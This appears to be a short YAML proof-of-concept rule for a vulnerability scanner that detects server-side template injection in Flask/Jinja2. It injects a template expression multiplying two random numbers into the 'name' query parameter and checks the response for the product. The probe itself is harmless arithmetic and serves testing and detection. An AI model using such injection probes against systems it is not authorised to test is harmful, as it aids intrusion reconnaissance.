name: poc-yaml-flask-ssti-rce
set:
  r1: randomInt(200000000, 2100000000)
  r2: randomInt(300000000, 3100000000)
rules:
  - method: GET
    path: /?name={{{{r1}} * {{r2}}}}
    expression: 
       response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
detail:
      author: elliot
      Affected Version: "Flask（Jinja2）"
      links:
        - https://github.com/vulhub/vulhub/tree/master/flask/ssti